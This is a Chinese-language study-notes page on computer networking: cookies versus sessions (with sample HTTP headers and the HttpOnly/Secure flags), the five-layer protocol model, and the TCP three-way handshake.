<h1 id="3-Cookie和Session的区别"><a href="#3-Cookie和Session的区别" class="headerlink" title="3. Cookie和Session的区别"></a>3. Cookie和Session的区别</h1><p>Cookie和Session都是用来跟踪浏览器用户身份的会话方式，但是两者的应用场景不太一样。</p>
<p>Cookie一般用来保存用户信息比如：</p>
<ol>
<li>我们在Cookie中保存已经登录过得用户信息，下次访问网站的时候页面可以自动帮你登录的一些基本信息给填了；</li>
<li>一般的网站都会有保持登录也就是说下次你再访问网站的时候就不需要重新登录了，这是因为用户登录的时候我们可以存放了一个 Token 在 Cookie 中，下次登录的时候只需要根据 Token 值来查找用户即可(为了安全考虑，重新登录一般要将 Token 重写)；</li>
<li>登录一次网站后访问网站其他页面不需要重新登录。</li>
</ol>
<p>Session 的主要作用就是通过服务端记录用户的状态。 典型的场景是购物车，当你要添加商品到购物车的时候，系统不知道是哪个用户操作的，因为 HTTP 协议是无状态的。服务端给特定的用户创建特定的 Session 之后就可以标识这个用户并且跟踪这个用户了。</p>
<p>Cookie 数据保存在客户端(浏览器端)，Session 数据保存在服务器端。</p>
<p>Cookie 存储在客户端中，而Session存储在服务器上，相对来说 Session 安全性更高。如果使用 Cookie 的一些敏感信息不要写入 Cookie 中，最好能将 Cookie 信息加密然后使用到的时候再去服务器端解密。</p>
<p>cookie和session的创建都是在服务器，但是cookie其状态是保存在客户端中的，session是保存在服务器中的。创建session时，服务器会在浏览器上创建一个cookie存储sessionID，后面客户端请求时服务器将读取sessionId找到对应的session。当浏览器关闭时，cookie会被删除，所以下次再访问时无法根据sessionId找到session，就会导致失效（但是实际上session还在，只是找不到了）</p>
<p><strong>cookie和session的选择</strong>：</p>
<ul>
<li>Cookie 只能存储 ASCII 码字符串，而 Session 则可以存储任何类型的数据，因此在考虑数据复杂性时首选 Session；</li>
<li>Cookie 存储在浏览器中，容易被恶意查看。如果非要将一些隐私数据存在 Cookie 中，可以将 Cookie 值进行加密，然后在服务器进行解密；</li>
<li>对于大型网站，如果用户所有的信息都存储在 Session 中，那么开销是非常大的，因此不建议将所有的用户信息都存储到 Session 中。</li>
</ul>
<h2 id="具体介绍"><a href="#具体介绍" class="headerlink" title="具体介绍"></a>具体介绍</h2><h3 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h3><p>HTTP协议是无状态的，主要是为了让HTTP协议尽可能简单，使得它能够处理大量事务。HTTP/1.1引入<code>Cookie</code>来保存状态信息。</p>
<p><code>Cookie</code>是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器之后向同一服务器再次发起请求时被携带上，用于告知服务端两个请求是否来自同一浏览器。由于之后每次请求都会需要携带<code>Cookie</code>数据，因此会带来额外的性能开销（尤其是在移动环境下）。</p>
<p><code>Cookie</code>曾一度用于客户端数据的存储，因为当时并没有其它合适的存储办法而作为唯一的存储手段，但现在随着现代浏览器开始支持各种各样的存储方式，<code>Cookie</code>渐渐被淘汰。新的浏览器 API 已经允许开发者直接将数据存储到本地，如使用<code>Web storage API</code>（本地存储和会话存储）或<code>IndexedDB</code>。</p>
<h4 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h4><ul>
<li>会话状态管理（如用户登录状态、购物车、游戏分数或者其它需要记录的信息）</li>
<li>个性化设置（如用户自定义设置、主题等）</li>
<li>浏览器行为跟踪（如跟踪分析用户行为等）</li>
</ul>
<h4 id="创建过程"><a href="#创建过程" class="headerlink" title="创建过程"></a>创建过程</h4><p>服务器发送的响应报文包含<code>Set-Cookie</code>首部字段，客户端得到响应报文后把<code>Cookie</code>内容保存到浏览器中</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">HTTP/<span class="number">1.0</span> <span class="number">200</span> OK</span><br><span class="line">Content-type: text/html</span><br><span class="line"><span class="built_in">Set</span>-Cookie: yummy_cookie=choco</span><br><span class="line"><span class="built_in">Set</span>-Cookie: tasty_cookie=strawberry</span><br><span class="line"></span><br><span class="line">[page content]</span><br></pre></td></tr></table></figure>

<p>客户端之后对同一个服务器发送请求时，会从浏览器中取出<code>Cookie</code>信息并通过<code>Cookie</code>请求首部字段发送给服务器</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">GET /sample_page.html HTTP/<span class="number">1.1</span></span><br><span class="line">Host: www.example.org</span><br><span class="line">Cookie: yummy_cookie=choco; tasty_cookie=strawberry</span><br></pre></td></tr></table></figure>

<h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><ul>
<li>会话期Cookie：浏览器关闭之后它会被自动删除，也就是说它仅在会话期内有效。</li>
<li>持久性 Cookie：指定过期时间（Expires）或有效期（max-age）之后就成为了持久性的 Cookie。</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Set</span>-Cookie: id=a3fWa; Expires=Wed, <span class="number">21</span> Oct <span class="number">2015</span> <span class="number">07</span>:<span class="number">28</span>:<span class="number">00</span> GMT;</span><br></pre></td></tr></table></figure>

<h4 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h4><p><code>Domain</code>标识指定了哪些主机可以接受 Cookie。如果不指定，默认为当前文档的主机（不包含子域名）。如果指定了 <code>Domain</code>，则一般包含子域名。例如，如果设置<code>Domain=mozilla.org</code>，则 Cookie 也包含在子域名中（如 developer.mozilla.org）。</p>
<p><code>Path</code>标识指定了主机下的哪些路径可以接受 Cookie（该 URL 路径必须存在于请求 URL 中）。以字符<code>%x2F</code>(即<code>/</code>) 作为路径分隔符，子路径也会被匹配。例如，设置<code>Path=/docs</code>，则以下地址都会匹配：</p>
<ul>
<li>/docs</li>
<li>/docs/Web/</li>
<li>/docs/Web/HTTP</li>
</ul>
<h4 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h4><p>浏览器通过<code>document.cookie</code>属性可创建新的<code>Cookie</code>，也可以通过该属性访问非<code>HttpOnly</code>标记的<code>Cookie</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.cookie = <span class="string">&quot;yummy_cookie=choco&quot;</span>;</span><br><span class="line"><span class="built_in">document</span>.cookie = <span class="string">&quot;tasty_cookie=strawberry&quot;</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">document</span>.cookie);</span><br></pre></td></tr></table></figure>

<h4 id="HttpOnly"><a href="#HttpOnly" class="headerlink" title="HttpOnly"></a>HttpOnly</h4><p>标记为<code>HttpOnly</code>的<code>Cookie</code>不能被JavaScript脚本调用。跨站脚本攻击（XSS） 常常使用 JavaScript 的<code>document.cookie</code> API 窃取用户的 Cookie 信息，因此使用<code>HttpOnly</code>标记可以在一定程度上避免 XSS 攻击。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Set-Cookie: id&#x3D;a3fWa; Expires&#x3D;Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly</span><br></pre></td></tr></table></figure>

<h4 id="Secure"><a href="#Secure" class="headerlink" title="Secure"></a>Secure</h4><p>标记为<code>Secure</code>的<code>Cookie</code>只能通过被 HTTPS 协议加密过的请求发送给服务端。但即便设置了<code>Secure</code>标记，敏感信息也不应该通过<code>Cookie</code>传输，因为<code>Cookie</code>有其固有的不安全性，<code>Secure</code>标记也无法提供确实的安全保障。</p>
<h4 id="浏览器禁用Cookie"><a href="#浏览器禁用Cookie" class="headerlink" title="浏览器禁用Cookie"></a>浏览器禁用Cookie</h4><p>此时无法使用 Cookie 来保存用户信息，只能使用 Session。除此之外，不能再将 Session ID 存放到 Cookie 中，而是使用 URL 重写技术，将 Session ID 作为 URL 的参数进行传递。</p>
<h3 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h3><p>除了可以将用户信息通过 Cookie 存储在用户浏览器中，也可以利用 Session 存储在服务器端，存储在服务器端的信息更加安全。</p>
<p>Session 可以存储在服务器上的文件、数据库或者内存中。也可以将 Session 存储在 Redis 这种内存型数据库中，效率会更高。</p>
<p>使用 Session 维护用户登录状态的过程如下：</p>
<ul>
<li>用户进行登录时，用户提交包含用户名和密码的表单，放入 HTTP 请求报文中；</li>
<li>服务器验证该用户名和密码，如果正确则把用户信息存储到 Redis 中，它在 Redis 中的 Key 称为 Session ID；</li>
<li>服务器返回的响应报文的 Set-Cookie 首部字段包含了这个 Session ID，客户端收到响应报文之后将该 Cookie 值存入浏览器中；</li>
<li>客户端之后对同一个服务器进行请求时会包含该 Cookie 值，服务器收到之后提取出 Session ID，从 Redis 中取出用户信息，继续之前的业务操作。</li>
</ul>
<p>应该注意 Session ID 的安全性问题，不能让它被恶意攻击者轻易获取，那么就不能产生一个容易被猜到的 Session ID 值。此外，还需要经常重新生成 Session ID。在对安全性要求极高的场景下，例如转账等操作，除了使用 Session 管理用户状态之外，还需要对用户进行重新验证，比如重新输入密码，或者使用短信验证码等方式。</p>
<h1 id="4-OSI与TCP-IP各层的结构与功能，都有哪些协议"><a href="#4-OSI与TCP-IP各层的结构与功能，都有哪些协议" class="headerlink" title="4. OSI与TCP/IP各层的结构与功能，都有哪些协议"></a>4. OSI与TCP/IP各层的结构与功能，都有哪些协议</h1><p><img src="http://qiniu.xiaoming.net.cn/%E4%BA%94%E5%B1%82%E4%BD%93%E7%B3%BB%E5%8D%8F%E8%AE%AE.png" alt="计算机网络体系结构"></p>
<p>一般采用五层协议。</p>
<h2 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a>物理层</h2><p>在物理层上所传送的数据单位是<strong>比特</strong>。物理层（physical player）的作用是<strong>实现相邻计算机节点之间比特流的透明传送，尽可能屏蔽掉具体传输介质和物理设备的差异</strong>。使其上面的数据链路层不必考虑网络的具体传输介质是什么。“透明传送比特流”表示经实际电路传送后的比特流没有发生变化，对传送的比特流来说，这个电路是看不见的。</p>
<h3 id="物理层知识点总结"><a href="#物理层知识点总结" class="headerlink" title="物理层知识点总结"></a>物理层知识点总结</h3><ol>
<li>物理层的主要任务就是确定与传输媒体接口有关的一些特性，如机械特性，电气特性，功能特性，过程特性。</li>
<li>一个数据通信系统可划分为三大部分，即源系统，传输系统，目的系统。源系统包括源点（或源站，信源）和发送器，目的系统包括接收器和终点。</li>
<li>通信的目的是传送消息。如话音，文字，图像等都是消息，数据是运送消息的实体。信号则是数据的电器或电磁的表现。</li>
<li>根据信号中代表消息的参数的取值方式不同，信号可分为模拟信号（或连续信号）和数字信号（或离散信号）。在使用时间域（简称时域）的波形表示数字信号时，代表不同离散数值的基本波形称为码元。</li>
<li>根据双方信息交互的方式，通信可划分为单向通信（或单工通信），双向交替通信（或半双工通信），双向同时通信（全双工通信）。</li>
<li>来自信源的信号称为基带信号。信号要在信道上传输就要经过调制。调制有基带调制和带通调制之分。最基本的带通调制方法有调幅，调频和调相。还有更复杂的调制方法，如正交振幅调制。</li>
<li>要提高数据在信道上的传递速率，可以使用更好的传输媒体，或使用先进的调制技术。但数据传输速率不可能任意被提高。</li>
<li>传输媒体可分为两大类，即导引型传输媒体（双绞线，同轴电缆，光纤）和非导引型传输媒体（无线，红外，大气激光）。</li>
<li>为了有效利用光纤资源，在光纤干线和用户之间广泛使用无源光网络PON。无源光网络无需配备电源，其长期运营成本和管理成本都很低。最流行的无源光网络是以太网无源光网络EPON和吉比特无源光网络GPON。</li>
</ol>
<h2 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a>数据链路层</h2><p>数据链路层（data link layer）通常简称为链路层，两台主机之间的数据传输，总是在一段一段的链路上传送的，这就需要使用专门的链路层的协议。在两个相邻节点之间传送数据时，数据链路层<strong>将网络层交下来的IP数据报组装成帧，在两个相邻节点间的链路上传送帧</strong>。每一帧包括数据和必要的控制信息（如同步信息，地址信息，差错控制等）</p>
<p>在接收数据时，控制信息使接收端能够知道一个帧从哪个比特开始和到哪个比特结束。这样，数据链路层在收到一个帧后，就可以从中提取出数据部分，上交给网络层。控制信息还使接收端能够检测到所收到的帧中有无差错。如果发现差错，数据链路层就简单地丢弃这个出了差错的帧，以避免继续在网络中传送下去白白浪费网络资源。如果需要改正数据在链路层传输时出现的差错（这就是说，数据链路层不仅要检错，而且还要纠错），那么就要采用可靠性传输协议来纠正出现的差错。这种方法会使链路层的协议复杂些。</p>
<h3 id="数据链路层知识点总结"><a href="#数据链路层知识点总结" class="headerlink" title="数据链路层知识点总结"></a>数据链路层知识点总结</h3><ol>
<li>链路是从一个结点到相邻节点的一段物理链路，数据链路则在链路的基础上增加了一些必要的硬件（如网络适配器）和软件（如协议的实现）</li>
<li>数据链路层使用的主要是<strong>点对点信道</strong>和<strong>广播信道</strong>两种。</li>
<li>数据链路层传输的协议数据单元是帧。数据链路层的三个基本问题是：<strong>封装成帧</strong>，<strong>透明传输</strong>和<strong>差错检测</strong></li>
<li><strong>循环冗余检验CRC</strong>是一种检错方法，而帧检验序列FCS是添加在数据后面的冗余码</li>
<li><strong>点对点协议PPP</strong>是数据链路层使用最多的一种协议，它的特点是：简单，只检测差错而不去纠正差错，不使用序号，也不进行流量控制，可同时支持多种网络层协议</li>
<li>PPPoE是为宽带上网的主机使用的链路层协议</li>
<li>局域网的优点是：具有广播功能，从一个站点可方便地访问全网；便于系统的扩展和逐渐演变；提高了系统的可靠性，可用性和生存性。</li>
<li>共向媒体通信资源的方法有二：一是静态划分信道(各种复用技术)，而是动态媒体接入控制，又称为多点接入（随即接入或受控接入）</li>
<li>计算机与外接局域网通信需要通过通信适配器（或网络适配器），它又称为网络接口卡或网卡。<strong>计算器的硬件地址就在适配器的ROM中</strong>。</li>
<li>以太网采用的无连接的工作方式，对发送的数据帧不进行编号，也不要求对方发回确认。目的站收到有差错帧就把它丢掉，其他什么也不做</li>
<li>以太网采用的协议是具有冲突检测的<strong>载波监听多点接入CSMA/CD</strong>。协议的特点是：<strong>发送前先监听，边发送边监听，一旦发现总线上出现了碰撞，就立即停止发送。然后按照退避算法等待一段随机时间后再次发送。</strong> 因此，每一个站点在自己发送数据之后的一小段时间内，存在这遭遇碰撞的可能性。以太网上的各站点平等的争用以太网信道</li>
<li>以太网的适配器具有过滤功能，它只接收单播帧，广播帧和多播帧。</li>
<li>使用集线器可以在物理层扩展以太网（扩展后的以太网仍然是一个网络）</li>
</ol>
<h2 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h2><p>在计算机网络中进行通信的两个计算机之间可能会经过很多个数据链路，也可能还要经过很多通信子网。<strong>网络层的任务就是选择合适的网间路由和交换结点， 确保数据及时传送。 在发送数据时，网络层把运输层产生的报文段或用户数据报封装成分组和包进行传送</strong>。在 TCP/IP 体系结构中，由于网络层使用 IP 协议，因此分组也叫 IP 数据报 ，简称数据报。</p>
<p>这里要注意：不要把运输层的“用户数据报 UDP ”和网络层的“ IP 数据报”弄混。另外，无论是哪一层的数据单元，都可笼统地用“分组”来表示。</p>
<p>这里强调指出，网络层中的“网络”二字已经不是我们通常谈到的具体网络，而是指计算机网络体系结构模型中第三层的名称.</p>
<p>互联网是由大量的异构（<code>heterogeneous</code>）网络通过路由器（<code>router</code>）相互连接起来的。互联网使用的网络层协议是无连接的网际协议（<code>Intert Protocol</code>）和许多路由选择协议，因此互联网的网络层也叫做网际层或IP层。</p>
<h3 id="网络层知识点总结"><a href="#网络层知识点总结" class="headerlink" title="网络层知识点总结"></a>网络层知识点总结</h3><ol>
<li>TCP/IP 协议中的网络层向上只提供简单灵活的，无连接的，尽最大努力交付的数据报服务。网络层不提供服务质量的承诺，不保证分组交付的时限所传送的分组可能出错，丢失，重复和失序。进程之间通信的可靠性由运输层负责</li>
<li>在互联网的交付有两种，一是在本网络直接交付不用经过路由器，另一种是和其他网络的间接交付，至少经过一个路由器，但最后一次一定是直接交付</li>
<li>分类的IP地址由网络号字段（指明网络）和主机号字段（指明主机）组成。网络号字段最前面的类别指明IP地址的类别。IP地址是一种分等级的地址结构。IP 地址管理机构分配 IP 地址时只分配网络号，主机号由得到该网络号的单位自行分配。路由器根据目的主机所连接的网络号来转发分组。一个路由器至少连接到两个网络，所以一个路由器至少应当有两个不同的IP地址</li>
<li>IP 数据报分为首部和数据两部分。首部的前一部分是固定长度，共20字节，是所有IP数据包必须具有的（源地址，目的地址，总长度等重要地段都固定在首部）。一些长度可变的可选字段固定在首部的后面。IP首部中的生存时间给出了IP数据报在互联网中所能经过的最大路由器数。可防止 IP 数据报在互联网中无限制的兜圈子。</li>
<li>地址解析协议 ARP 把 IP 地址解析为硬件地址。ARP 的高速缓存可以大大减少网络上的通信量。因为这样可以使主机下次再与同样地址的主机通信时，可以直接从高速缓存中找到所需要的硬件地址而不需要再去广播方式发送 ARP 请求分组</li>
<li>无分类域间路由选择CIDR是解决目前IP地址紧缺的一个好办法。CIDR 记法把 IP 地址后面加上斜线“/”，然后写上前缀所所占的位数。前缀，或网络前缀用来指明网络，前缀后面的部分是后缀，用来指明主机。CIDR 把前缀都相同的连续的IP地址组成一个“CIDR地址块”，IP地址分配都以CIDR地址块为单位。</li>
<li>网际控制报文协议是IP层的协议。ICMP 报文作为IP数据报的数据，加上首部后组成IP数据报发送出去。使用ICMP数据报并不是为了实现可靠传输。ICMP允许主机或路由器报告差错情况和提供有关异常情况的报告。ICMP报文的种类有两种 ICMP差错报告报文和ICMP询问报文。</li>
<li>要解决IP地址耗尽的问题，最根本的办法是采用具有更大地址空间的新版本IP协议-IPv6。IPv6所带来的变化有<ul>
<li>更大的地址空间（采用128位地址)</li>
<li>灵活的首部格式</li>
<li>改进的选项</li>
<li>支持即插即用</li>
<li>支持资源的预分配</li>
<li>IPv6的首部改为8字节对齐。</li>
<li>另外IP数据报的目的地址可以是以下三种基本类型地址之一：单播，多播和任播</li>
</ul>
</li>
<li>虚拟专用网络 VPN 利用公用的互联网作为本机构专用网之间的通信载体。VPN 内使用互联网的专用地址。一个 VPN 至少要有一个路由器具有合法的全球 IP 地址，这样才能和本系统的另一个 VPN 通过互联网进行通信。所有通过互联网传送的数据都需要加密</li>
<li>MPLS的特点是：<ul>
<li>支持面向连接的服务质量</li>
<li>支持流量工程，平衡网络负载</li>
<li>有效的支持虚拟专用网VPN。MPLS在入口节点给每一个IP数据报打上固定长度的“标记”，然后根据标记在第二层（链路层）用硬件进行转发（在标记交换路由器中进行标记交换），因而转发速率大大加快。</li>
</ul>
</li>
</ol>
<h2 id="运输层"><a href="#运输层" class="headerlink" title="运输层"></a>运输层</h2><p>运输层(transport layer)的主要任务就是<strong>负责向两台主机进程之间的通信提供通用的数据传输服务</strong>。应用进程利用该服务传送应用层报文。“通用的”是指并不针对某一个特定的网络应用，而是多种应用可以使用同一个运输层服务。由于一台主机可同时运行多个进程，因此运输层有复用和分用的功能。所谓复用就是指多个应用层进程可同时使用下面运输层的服务，分用和复用相反，是运输层把收到的信息分别交付上面应用层中的相应进程。<strong>传输层传输的数据单位是报文段</strong>。</p>
<p>运输层主要使用以下两种协议：</p>
<ol>
<li><strong>传输控制协议TCP</strong>（Transaction Control Protocol）：提供面向连接的，可靠的数据传输服务</li>
<li><strong>用户数据协议UDP</strong>（User Datagram Protocol）：提供无连接的，尽最大努力的数据传输服务，不保证数据传输的可靠性</li>
</ol>
<h3 id="运输层知识点总结"><a href="#运输层知识点总结" class="headerlink" title="运输层知识点总结"></a>运输层知识点总结</h3><ol>
<li>运输层提供应用进程之间的逻辑通信，也就是说，运输层之间的通信并不是真正在两个运输层之间直接传输数据。运输层向应用层屏蔽了下面网络的细节（如网络拓补，所采用的路由选择协议等），它使应用进程之间看起来好像两个运输层实体之间有一条端到端的逻辑通信信道。</li>
<li>网络层为主机提供逻辑通信，而运输层为应用进程之间提供端到端的逻辑通信。</li>
<li>运输层的两个重要协议是用户数据报协议UDP和传输控制协议TCP。按照OSI的术语，两个对等运输实体在通信时传送的数据单位叫做运输协议数据单元TPDU（Transport Protocol Data Unit）。但在TCP/IP体系中，则根据所使用的协议是TCP或UDP，分别称之为TCP报文段或UDP用户数据报。</li>
<li>UDP在传送数据之前不需要先建立连接，远地主机在收到UDP报文后，不需要给出任何确认。虽然UDP不提供可靠交付，但在某些情况下UDP确是一种最有效的工作方式。 TCP提供面向连接的服务。在传送数据之前必须先建立连接，数据传送结束后要释放连接。TCP不提供广播或多播服务。由于TCP要提供可靠的，面向连接的传输服务，这一难以避免增加了许多开销，如确认，流量控制，计时器以及连接管理等。这不仅使协议数据单元的首部增大很多，还要占用许多处理机资源。</li>
<li>硬件端口是不同硬件设备进行交互的接口，而软件端口是应用层各种协议进程与运输实体进行层间交互的一种地址。UDP和TCP的首部格式中都有源端口和目的端口这两个重要字段。当运输层收到IP层交上来的运输层报文时，就能够根据其首部中的目的端口号把数据交付应用层的目的应用层。（两个进程之间进行通信不光要知道对方IP地址而且要知道对方的端口号(为了找到对方计算机中的应用进程)）</li>
<li>运输层用一个16位端口号标志一个端口。端口号只有本地意义，它只是为了标志计算机应用层中的各个进程在和运输层交互时的层间接口。在互联网的不同计算机中，相同的端口号是没有关联的。协议端口号简称端口。虽然通信的终点是应用进程，但只要把所发送的报文交到目的主机的某个合适端口，剩下的工作（最后交付目的进程）就由TCP和UDP来完成。</li>
<li>运输层的端口号分为服务器端使用的端口号（0<del>1023指派给熟知端口，1024</del>49151是登记端口号）和客户端暂时使用的端口号（49152~65535）</li>
<li>UDP的主要特点是<ul>
<li>无连接</li>
<li>尽最大努力交付</li>
<li>面向报文</li>
<li>无拥塞控制</li>
<li>支持一对一，一对多，多对一和多对多的交互通信</li>
<li>首部开销小（只有四个字段：源端口，目的端口，长度和检验和）</li>
</ul>
</li>
<li>TCP的主要特点是<ul>
<li>面向连接</li>
<li>每一条TCP连接只能是一对一的</li>
<li>提供可靠交付</li>
<li>提供全双工通信</li>
<li>面向字节流</li>
</ul>
</li>
<li>TCP用主机的IP地址加上主机上的端口号作为TCP连接的端点。这样的端点就叫做套接字（socket）或插口。套接字用（IP地址：端口号）来表示。每一条TCP连接唯一被通信两端的两个端点所确定。</li>
<li>停止等待协议是为了实现可靠传输的，它的基本原理就是每发完一个分组就停止发送，等待对方确认。在收到确认后再发下一个分组。</li>
<li>为了提高传输效率，发送方可以不使用低效率的停止等待协议，而是采用流水线传输。流水线传输就是发送方可连续发送多个分组，不必每发完一个分组就停下来等待对方确认。这样可使信道上一直有数据不间断的在传送。这种传输方式可以明显提高信道利用率。</li>
<li>停止等待协议中超时重传是指只要超过一段时间仍然没有收到确认，就重传前面发送过的分组（认为刚才发送过的分组丢失了）。因此每发送完一个分组需要设置一个超时计时器，其重转时间应比数据在分组传输的平均往返时间更长一些。这种自动重传方式常称为自动重传请求ARQ。另外在停止等待协议中若收到重复分组，就丢弃该分组，但同时还要发送确认。连续ARQ协议可提高信道利用率。发送维持一个发送窗口，凡位于发送窗口内的分组可连续发送出去，而不需要等待对方确认。接收方一般采用累积确认，对按序到达的最后一个分组发送确认，表明到这个分组位置的所有分组都已经正确收到了。</li>
<li>TCP报文段的前20个字节是固定的，后面有4n字节是根据需要增加的选项。因此，TCP首部的最小长度是20字节。</li>
<li>TCP使用滑动窗口机制。发送窗口里面的序号表示允许发送的序号。发送窗口后沿的后面部分表示已发送且已收到确认，而发送窗口前沿的前面部分表示不允许发送。发送窗口后沿的变化情况有两种可能，即不动（没有收到新的确认）和前移（收到了新的确认）。发送窗口的前沿通常是不断向前移动的。一般来说，我们总是希望数据传输更快一些。但如果发送方把数据发送的过快，接收方就可能来不及接收，这就会造成数据的丢失。所谓流量控制就是让发送方的发送速率不要太快，要让接收方来得及接收。</li>
<li>在某段时间，若对网络中某一资源的需求超过了该资源所能提供的可用部分，网络的性能就要变坏。这种情况就叫拥塞。拥塞控制就是为了防止过多的数据注入到网络中，这样就可以使网络中的路由器或链路不致过载。拥塞控制所要做的都有一个前提，就是网络能够承受现有的网络负荷。拥塞控制是一个全局性的过程，涉及到所有的主机，所有的路由器，以及与降低网络传输性能有关的所有因素。相反，流量控制往往是点对点通信量的控制，是个端到端的问题。流量控制所要做到的就是抑制发送端发送数据的速率，以便使接收端来得及接收。</li>
<li>为了进行拥塞控制，TCP发送方要维持一个拥塞窗口cwnd的状态变量。拥塞控制窗口的大小取决于网络的拥塞程度，并且动态变化。发送方让自己的发送窗口取为拥塞窗口和接收方的接受窗口中较小的一个。</li>
<li>TCP的拥塞控制采用了四种算法，即慢开始，拥塞避免，快重传和快恢复。在网络层也可以使路由器采用适当的分组丢弃策略（如主动队列管理AQM），以减少网络拥塞的发生。</li>
<li>运输连接的三个阶段，即：连接建立，数据传送和连接释放。</li>
<li>主动发起TCP连接建立的应用进程叫做客户，而被动等待连接建立的应用进程叫做服务器。TCP连接采用三报文握手机制。服务器要确认用户的连接请求，然后客户要对服务器的确认进行确认。</li>
<li>TCP的连接释放采用四报文握手机制。任何一方都可以在数据传送结束后发出连接释放的通知，待对方确认后进入半关闭状态。当另一方也没有数据再发送时，则发送连接释放通知，对方确认后就完全关闭了TCP连接</li>
</ol>
<h2 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h2><p>应用层(application-layer）的任务是<strong>通过应用进程间的交互来完成特定网络应用</strong>。应用层协议定义的是应用进程（进程：主机中正在运行的程序）间的通信和交互的规则。对于不同的网络应用需要不同的应用层协议。在互联网中应用层协议很多，如域名系统DNS，支持万维网应用的 HTTP协议，支持电子邮件的 SMTP协议等等。我们把<strong>应用层交互的数据单元称为报文</strong>。</p>
<h3 id="域名系统"><a href="#域名系统" class="headerlink" title="域名系统"></a>域名系统</h3><blockquote>
<p>域名系统(Domain Name System缩写 DNS，Domain Name被译为域名)是因特网的一项核心服务，它作为可以将域名和IP地址相互映射的一个分布式数据库，能够使人更方便的访问互联网，而不用去记住能够被机器直接读取的IP数串。（百度百科）例如：一个公司的 Web 网站可看作是它在网上的门户，而域名就相当于其门牌地址，通常域名都使用该公司的名称或简称。例如上面提到的微软公司的域名，类似的还有：IBM 公司的域名是 <a href="http://www.ibm.com、oracle/">www.ibm.com、Oracle</a> 公司的域名是 <a href="http://www.oracle.com、cisco公司的域名是/">www.oracle.com、Cisco公司的域名是</a> <a href="http://www.cisco.com/">www.cisco.com</a> 等。</p>
</blockquote>
<h3 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h3><blockquote>
<p>超文本传输协议（HTTP，HyperText Transfer Protocol)是互联网上应用最为广泛的一种网络协议。所有的 WWW（万维网） 文件都必须遵守这个标准。设计 HTTP 最初的目的是为了提供一种发布和接收 HTML 页面的方法。（百度百科）</p>
</blockquote>
<h1 id="5-三次握手和四次挥手"><a href="#5-三次握手和四次挥手" class="headerlink" title="5. 三次握手和四次挥手"></a>5. 三次握手和四次挥手</h1><p>为了准确无误地把数据送达目标处，TCP协议采用了三次握手策略。</p>
<h2 id="三次握手"><a href="#三次握手" class="headerlink" title="三次握手"></a>三次握手</h2><p><img src="https://qiniu.xiaoming.net.cn/%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B1.png" alt="三次握手1"></p>
<p><img src="https://qiniu.xiaoming.net.cn/%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B2.png" alt="三次握手2"></p>
<p><img src="https://qiniu.xiaoming.net.cn/%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B3.png" alt="三次握手3"></p>
<ul>
<li><p>首先服务端处于<code>LISTEN</code>（监听）状态，等待客户端的连接请求</p>
</li>
<li><p>客户端：发送带有<code>SYN</code>标志的数据包（一次握手-服务器）</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">  SYN = <span class="number">1</span></span><br><span class="line">  ACK = <span class="number">0</span></span><br><span class="line">seq = x # 初始序号</span><br></pre></td></tr></table></figure>
</li>
<li><p>服务端：发送带有<code>SYN/ACK</code>标志的数据包（二次握手-客户端）</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">  SYN = <span class="number">1</span></span><br><span class="line">  ACK = <span class="number">1</span></span><br><span class="line">ack = x+1 # 确认号</span><br><span class="line">  seq = y # 也发送一个初始序号</span><br></pre></td></tr></table></figure></li>
<li><p>客户端：发送带有<code>ACK</code>标志的数据包（三次握手-服务器）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ACK &#x3D; 1</span><br><span class="line">seq &#x3D; x+1</span><br><span class="line">ack &#x3D; y+1</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="为什么要三次握手？"><a href="#为什么要三次握手？" class="headerlink" title="为什么要三次握手？"></a>为什么要三次握手？</h3><p>主要是用于确认服务端和客户端双方收发功能正常，缺一不可。</p>
<p>第一次握手：客户端什么都不能确认，服务端确认对方发送正常，自己接受正常。</p>
<p>第二次握手：客户端确认自己发送正常，接收正常，对方发送正常，接收正常；服务端确对方发送正常，自己接收正常。</p>
<p>第三次握手：客户端确认自己发送正常，接收正常，对方发送正常，接收正常；服务端确认自己发送正常，接收正常，对方发送正常，接收正常。</p>
<h3 id="为啥要传回SYN"><a href="#为啥要传回SYN" class="headerlink" title="为啥要传回SYN"></a>为啥要传回SYN</h3><p>接收端传回发送端发送的<code>SYN</code>是为了告诉发送端，我接收到的信息确实就是你所发送的信号了。</p>
<blockquote>
<p><code>SYN</code>是 TCP/IP 建立连接时使用的握手信号。在客户端和服务器之间建立正常的 TCP 网络连接时，客户机首先发出一个<code>SYN</code>消息，服务器使用<code>SYN-ACK</code>应答表示接收到了这个消息，最后客户机再以<code>ACK</code>(Acknowledgement[汉译：确认字符 ,在数据通信传输中，接收站发给发送站的一种传输控制字符。它表示确认发来的数据已经接受无误。]）消息响应。这样在客户机和服务器之间才能建立起可靠的TCP连接，数据才可以在客户机和服务器之间传递。</p>
</blockquote>
